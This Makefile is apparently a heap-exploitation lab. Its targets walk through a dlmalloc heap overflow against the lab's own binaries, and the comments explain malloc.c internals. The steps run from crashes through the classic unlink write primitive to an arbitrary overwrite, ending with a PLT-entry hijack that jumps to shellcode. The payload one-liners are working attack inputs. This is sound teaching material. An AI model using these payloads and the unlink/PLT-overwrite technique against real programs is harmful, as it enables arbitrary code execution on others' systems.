.PHONY: crash_strcpy

crash_strcpy: a
	# Writing too much reaches unmapped pages and crashing during strcpy.
	gdb ./a -q --batch -ex 'run `python -c "print('a'*5000)"`' -ex 'quit'

.PHONY: crash_dlfree_chunksize

crash_dlfree1: a
	# Overwriting the heap metadata crashes dlfree.
	# This is how the heap looks: ( p1[1024] )( p2_metadata[8] )( p2[1024] )
	#							  ^ We start here.
	# p2_metadata[0:4] is prevsize, p2_metadata[4:8] is size.
	# Now, check out malloc.c:
	#   ...
	#   1997 #define chunksize(p)           ((p)->size & ~(SIZE_BITS)).
	#   ...
	#   2003 #define chunk_at_offset(p, s)  ((mchunkptr)(((char*)(p)) + (s)))
	#   ...
	#   3642 nextchunk = chunk_at_offset(p, size);
	#   3641 nextsize  = chunksize(nextchunk);
	#   ...
	# nextchunk is p2_metadata + p2_metadata->size ==
	#              p2_metadata + p2_metadata[4:8]  ==
	#              p2_metadata + 'aaaa'            ==
	#              p2_metadata + 1633771873
	# chunksize is (p2_metadata + 1633771873)->size ==
	#              (p2_metadata + 1633771873)[4:8]  ==
	#              unmapped memory (crash)
	gdb ./a -q --batch -ex "run `python -c "print('a'*1050)"`" -ex 'quit'

.PHONY: crash_dlfree_unlink

crash_dlfree2: a
	# This time, p2_meatdata[4:8] is set to -4 ('\xfc\xff\xff\xff'), so:
	# nextchunk is p2_metadata + p2_metadata->size ==
	#              p2_metadata + p2_metadata[4:8]  ==
	#              p2_metadata - 4
	# chunksize is (p2_metadata - 4)->size ==
	#              (p2_metadata - 4)[4:8]  ==
	#              p2_metadata[0:4]	       ==
	#              mapped memory (no crash)
	# But then we reach:
	#   ...
	#   1973 #define prev_inuse(p) ((p)->size & PREV_INUSE)
	#   ...
	#   2102 #define unlink(P, BK, FD) { \
	#   2103   FD = P->fd;               \
	#   2104   BK = P->bk;               \
	#   2105   FD->bk = BK;              \
	#   2106   BK->fd = FD;              \
	#   2107 }
	#   ...
	#   3645 if (!prev_inuse(p)) {
	#   3646   prevsize = p->prev_size;
	#   3647   size += prevsize;
	#   3648   p = chunk_at_offset(p, -((long) prevsize));
	#   3649   unlink(p, bck, fwd);
	#   3650 }
	#   ...
	# prev_inuse(p) == p2_metadata[4:8] & PREV_INUSE == 0xfcffffffff & 0x01 == true so prevsize
	# is p2_metdata[0:4] == 'aaaa' == 1633771873 and p = p2_metadata - 1633771873.
	# Then, unlink(p, bck, fwd) accesses p->fd == (p2_metadata - 1633771869)[8:12], and crashes.
	gdb ./a -q --batch -ex "run `python -c "print('a'*1028 + '\xfc\xff\xff\xff')"`" -ex 'quit'
	
crash_dlfree3: a
	# This time, p2_meatdata[0:4] is set to -4 ('\xfc\xff\xff\xff') too, so prevsize is
	# p2_metdata[0:4] = -4 and p is set to p2_metadata - -4 = p2_metadata + 4.
	# unlink(p, bck, fwd) then does:
	#   FD = P->fd == (p2_metadata + 4)[ 8:12] == p2_metadata[12:16]
	#   BK = P->bk == (p2_metadata + 4][12:16] == p2_metadata[16:20]
	#   FD->bk == (p2_metadata[12:16])[12:16] = BK
	#   BK->fd == (p2_metadata[16:20])[ 8:12] = FD
	# Since p2_metadata[12:16] and p2_metadata[16:20] are 'bbbb', we still crash, but we're almost there.
	gdb ./a -q --batch -ex "run `python -c "print('a'*1024 + '\xfc\xff\xff\xff'*2 + 'aaaa' + 'bbbb'*8)"`" -ex 'quit'

crash_dlfree4: a
	# This time, p2_meatdata[12:16] and p2_metadata[16:20] are set to valid stack addresses (0xbffff650),
	# so unlink works and we crash elsewhere!
	gdb ./a -q --batch -ex "run `python -c "print('a'*1024 + '\xfc\xff\xff\xff'*2 + 'aaaa' + '\x50\xf6\xff\xbf'*2)"`" -ex 'quit'

overwrite_n: a
	# So let's use our newfound power and set p2_metadata[12:16] to &n-12, and p2_metadata[16:20] to 0xbffff650. This way:
	#   FD->bk == (p2_metadata[12:16])[12:16] == (&n-12)[12:16] == (&n)[0:4] is set to 0xbffff650.
	#   BK->fd == (p2_metadata[16:20])[ 8:12] == (0xbffff650)[8:12] == 0xbffff658 is set to &n-12.
	# nm ./a | grep -w n tells us n is at 0x0804d040, so &n-12 == 0x0804d034.
	./a `python -c "print('a'*1024 + '\xfc\xff\xff\xff'*2 + 'aaaa' + '\x34\xd0\x04\x08' + '\x50\xf6\xff\xbf')"`

overwrite_plt: b
	# Now let's overwrite a PLT entry to jump to out shellcode.
	# Assuming dlfree is linked dynamically, it'll have a PLT entry, and since dlfree(p1) is called immediately after dlfree(p2),
	# it suits us well. Assuming the heap is executable, we put our shellcode there, and set p2_metadata[12:16] to dlfree's PLT
	# entry - 12, and p2_metadata[16:20] to &shellcode, so:
	#   FD->bk == (p2_metadata[12:16])[12:16] == (dlfree@plt-12)[12:16] == (dlfree@plt)[0:4] is set to &shellcode.
	#   BK->fd == (p2_metadata[16:20])[ 8:12] == (&shellcode)[8:12] is set to dlfree@plt.
	# That last part is a problem, since it overwrites part of our shellcode. Luckily, it's a part 8 bytes into the shellcode, so
	# we can safely skip over it:
	#   0-1  EB XX  JMP _SHELLCODE
	#   2    90     NOP
	#   3    90     NOP
	#   4    90     NOP
	#   5    90     NOP
	#   6    90     NOP
	#   7    90     NOP
	#   8    90     NOP # This is overwritten.
	#   9    90     NOP # This is overwritten.
	#   10   90     NOP # This is overwritten.
	#   11   90     NOP # This is overwritten.
	#   ...  <SHELLCODE>
	# objdump -R b | grep dlfree tells us dlfree@plt is at 0x0804a014, so dlfree@plt-12 == 0x0804a008.
	# gdb ./b -q --batch -ex 'break 18' -ex 'run' -ex 'print p1' -ex 'quit' tells us shellcode is at 0x0804b008.
	./b "`python -c "print(open('shellcode.bin').read().ljust(1024, 'a') + '\xfc\xff\xff\xff'*2 + 'aaaa' + '\x08\xa0\x04\x08' + '\x08\xb0\x04\x08')"`"

a: a.c malloc.c malloc.h
	gcc -g a.c malloc.c -o a 2>/dev/null

b: b.c malloc.h libmalloc.so
	# -lmalloc links against libmalloc.so dynamically.
	# -L. tells the static linker to look for libraries in the current directory.
	# -Wl,-rpath '-Wl,$ORIGIN' tells the dynamic linker to look for dynamic libraries in the current directory.
	gcc -g b.c -lmalloc -L. -Wl,-rpath '-Wl,$$ORIGIN' -o b

libmalloc.so: malloc.c malloc.h
	# -shared compiles this as a shared library.
	# -DUSE_DL_PREFIX defines "USE_DL_PREFIX" which causes the compiled functions to be called dlmalloc and dlfree (for clarity).
	gcc -shared -DUSE_DL_PREFIX malloc.c -o libmalloc.so 2>/dev/null
